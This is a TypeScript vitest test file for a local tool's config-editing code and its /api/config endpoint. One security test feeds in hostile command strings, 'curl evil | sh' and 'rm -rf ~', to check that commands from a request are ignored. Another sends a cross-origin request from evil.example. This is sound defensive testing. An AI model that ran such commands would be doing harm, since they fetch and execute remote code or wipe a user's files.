import type { AddressInfo } from 'node:net';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import type { ConfigUpdate, ConfigView } from '../shared/types.ts';
import { createApp } from './app.ts';
import { ConfigError, loadConfig, parseConfig } from './config.ts';
import { applyConfigUpdate, readConfigView, readOnlyView } from './configEdit.ts';
import { demoCollector } from './demo.ts';
import { Monitor } from './monitor.ts';
import { Runner } from './runner.ts';

let dir = '';
beforeAll(async () => void (dir = await mkdtemp(path.join(tmpdir(), 'nightshift-edit-'))));
afterAll(() => rm(dir, { recursive: true }));

const BASE = {
  port: 4999,
  thresholds: { idleMinutes: 10 },
  customKey: 'kept',
  projects: [
    { name: 'App', repoPath: '~/code/app', tmuxSession: 'app', testCommand: 'npm test', logFile: 'logs/a.log' },
    { name: 'Lib', repoPath: '/repo/lib' },
  ],
};
const toUpdate = (v: ConfigView): ConfigUpdate => ({ settings: structuredClone(v.settings), projects: v.projects.map(({ id, name, repoPath, tmuxSession, logFile }) => ({ id, name, repoPath, tmuxSession, logFile })) });
const issuesOf = (fn: () => void): string[] => {
  try {
    fn();
  } catch (e) {
    if (e instanceof ConfigError) return e.issues;
    throw e;
  }
  return [];
};

async function jsonFile(name = 'c.json') {
  const file = path.join(dir, name);
  await writeFile(file, JSON.stringify(BASE));
  return file;
}

describe('readConfigView', () => {
  it('shows raw path strings, effective settings and command locks', async () => {
    const v = readConfigView(await jsonFile(), '/base');
    expect(v).toMatchObject({ format: 'json', editable: true, fileOnly: { host: '127.0.0.1', port: 4999, reportsDir: '/base/reports' } });
    expect(v.settings.thresholds).toEqual({ idleMinutes: 10, stalledMinutes: 30, noCommitMinutes: 30 });
    expect(v.projects).toEqual([
      { id: 'app', name: 'App', repoPath: '~/code/app', tmuxSession: 'app', logFile: 'logs/a.log', testCommand: 'npm test', buildCommand: null, repoPathLocked: true },
      { id: 'lib', name: 'Lib', repoPath: '/repo/lib', tmuxSession: null, logFile: null, testCommand: null, buildCommand: null, repoPathLocked: false },
    ]);
  });

  it('works when the file does not exist yet', () => {
    const v = readConfigView(path.join(dir, 'nope.json'), '/base');
    expect(v.projects).toEqual([]);
    expect(v.settings.refreshIntervalSec).toBe(5);
  });
});

describe('applyConfigUpdate', () => {
  it('writes editable fields and keeps commands, unknown keys and file-only values', async () => {
    const file = await jsonFile();
    const u = toUpdate(readConfigView(file, '/base'));
    u.settings.refreshIntervalSec = 2;
    u.settings.thresholds.stalledMinutes = 45;
    u.settings.promptPatterns = ['(y/n)'];
    u.settings.autoReportTime = '06:30';
    u.projects[0]!.name = 'App Renamed';
    u.projects[0]!.tmuxSession = null;
    u.projects[1]!.repoPath = '/repo/lib2';
    u.projects.push({ id: null, name: 'New', repoPath: '~/code/new', tmuxSession: 'new', logFile: null });
    applyConfigUpdate(file, '/base', u);

    const raw = JSON.parse(await readFile(file, 'utf8'));
    expect(raw).toMatchObject({ port: 4999, customKey: 'kept', refreshIntervalSec: 2, thresholds: { idleMinutes: 10, stalledMinutes: 45 }, promptPatterns: ['(y/n)'], autoReportTime: '06:30' });
    expect(raw.projects).toEqual([
      { name: 'App Renamed', repoPath: '~/code/app', testCommand: 'npm test', logFile: 'logs/a.log' },
      { name: 'Lib', repoPath: '/repo/lib2' },
      { name: 'New', repoPath: '~/code/new', tmuxSession: 'new' },
    ]);
    expect(loadConfig(file, '/base').config.projects.map((p) => p.id)).toEqual(['app-renamed', 'lib', 'new']);
    // 건드리지 않은 기본값은 파일에 쓰지 않는다
    expect(raw).not.toHaveProperty('errorPatterns');
    expect(raw.thresholds).not.toHaveProperty('noCommitMinutes');
  });

  it('never takes commands, host or port from the request', async () => {
    const file = await jsonFile();
    const u = toUpdate(readConfigView(file, '/base')) as unknown as { settings: Record<string, unknown>; projects: Record<string, unknown>[] };
    u.settings.host = '0.0.0.0';
    u.settings.port = 1;
    u.settings.reportsDir = '/etc';
    u.projects[0]!.testCommand = 'curl evil | sh';
    u.projects[1]!.buildCommand = 'rm -rf ~';
    u.projects.push({ id: null, name: 'Evil', repoPath: '/tmp', testCommand: 'id', buildCommand: 'id' });
    applyConfigUpdate(file, '/base', u);
    const { config } = loadConfig(file, '/base');
    expect(config).toMatchObject({ host: '127.0.0.1', port: 4999, reportsDir: '/base/reports' });
    expect(config.projects.map((p) => [p.testCommand, p.buildCommand])).toEqual([['npm test', null], [null, null], [null, null]]);
  });

  it('refuses to move a project that has commands, and leaves the file untouched on any error', async () => {
    const file = await jsonFile();
    const before = await readFile(file, 'utf8');
    const fresh = () => toUpdate(readConfigView(file, '/base'));

    const moved = fresh();
    moved.projects[0]!.repoPath = '/somewhere/else';
    expect(issuesOf(() => applyConfigUpdate(file, '/base', moved))[0]).toContain('config 파일에서만 바꿀 수 있습니다');

    const bad = fresh();
    bad.settings.thresholds.idleMinutes = -5;
    bad.settings.errorPatterns = ['/(/'];
    bad.settings.autoReportTime = '25:00';
    bad.projects[1]!.name = '';
    bad.projects[1]!.tmuxSession = 'a:b';
    expect(issuesOf(() => applyConfigUpdate(file, '/base', bad))).toHaveLength(5);

    const ghost = fresh();
    ghost.projects.push({ ...ghost.projects[0]!, name: 'dup' }, { id: 'nope', name: 'x', repoPath: '/x', tmuxSession: null, logFile: null });
    expect(issuesOf(() => applyConfigUpdate(file, '/base', ghost))).toHaveLength(2);

    expect(issuesOf(() => applyConfigUpdate(file, '/base', { settings: 'x' }))).toHaveLength(1);
    expect(issuesOf(() => applyConfigUpdate(file, '/base', null))).toHaveLength(1);
    expect(await readFile(file, 'utf8')).toBe(before);
  });

  it('the same path written differently is not a move', async () => {
    const file = await jsonFile();
    const u = toUpdate(readConfigView(file, '/base'));
    u.projects[0]!.repoPath = '~/code/../code/app';
    expect(issuesOf(() => applyConfigUpdate(file, '/base', u))).toEqual([]);
  });

  it('deletes projects left out of the list', async () => {
    const file = await jsonFile();
    const u = toUpdate(readConfigView(file, '/base'));
    u.projects = [u.projects[1]!];
    applyConfigUpdate(file, '/base', u);
    expect(readConfigView(file, '/base').projects.map((p) => p.id)).toEqual(['lib']);
  });

  it('edits YAML in place, keeping comments on untouched keys', async () => {
    const file = path.join(dir, 'c.yaml');
    await writeFile(file, '# my config\nport: 4999 # keep me\nrefreshIntervalSec: 5\nprojects:\n  - name: App\n    repoPath: /repo/app\n    testCommand: npm test\n');
    const u = toUpdate(readConfigView(file, '/base'));
    u.settings.refreshIntervalSec = 3;
    u.settings.notifications = false;
    applyConfigUpdate(file, '/base', u);
    const text = await readFile(file, 'utf8');
    expect(text).toContain('# my config');
    expect(text).toContain('port: 4999 # keep me');
    expect(text).toContain('refreshIntervalSec: 3');
    expect(loadConfig(file, '/base').config).toMatchObject({ notifications: false, projects: [{ testCommand: 'npm test' }] });
  });

  it('creates a missing YAML or JSON file', async () => {
    for (const name of ['new/created.yml', 'new/created.json']) {
      const file = path.join(dir, name);
      const u = toUpdate(readConfigView(file, '/base'));
      u.projects.push({ id: null, name: 'First', repoPath: '/repo/first', tmuxSession: null, logFile: null });
      applyConfigUpdate(file, '/base', u);
      expect(loadConfig(file, '/base').config.projects.map((p) => p.id)).toEqual(['first']);
    }
  });
});

describe('/api/config', () => {
  const config = parseConfig({}, '/base');
  const runner = new Runner({ timeoutSec: 1, logDir: null });
  const monitor = new Monitor({ config, collector: demoCollector(), runs: runner.get });
  const state = { view: readOnlyView(config, '/x/c.json', 'demo') as ConfigView };
  const update = vi.fn(async (body: unknown) => {
    if ((body as { settings?: unknown }).settings === 'bad') throw new ConfigError(['문제 1', '문제 2']);
    return state.view;
  });
  const server = createApp({ config, monitor, runner, reportsDir: () => '/nonexistent', configEditor: { view: () => state.view, update } }).listen(0, '127.0.0.1');
  const url = () => `http://127.0.0.1:${(server.address() as AddressInfo).port}/api/config`;
  const put = (body: string) => fetch(url(), { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body });
  afterAll(() => void server.close());

  it('serves the view and blocks writes when read-only', async () => {
    expect(await (await fetch(url())).json()).toMatchObject({ editable: false, readOnlyReason: 'demo' });
    expect((await put('{}')).status).toBe(403);
    expect(update).not.toHaveBeenCalled();
  });

  it('returns validation issues as 400 and rejects malformed or cross-origin bodies', async () => {
    state.view = { ...state.view, editable: true, readOnlyReason: null };
    const bad = await put('{"settings":"bad"}');
    expect(bad.status).toBe(400);
    expect(await bad.json()).toEqual({ error: 'config 가 올바르지 않습니다', issues: ['문제 1', '문제 2'] });
    expect((await put('{not json')).status).toBe(400);
    const cross = await fetch(url(), { method: 'PUT', headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' }, body: '{}' });
    expect(cross.status).toBe(403);
    expect((await put('{"settings":{},"projects":[]}')).status).toBe(200);
    expect(update).toHaveBeenCalledTimes(2);
  });
});
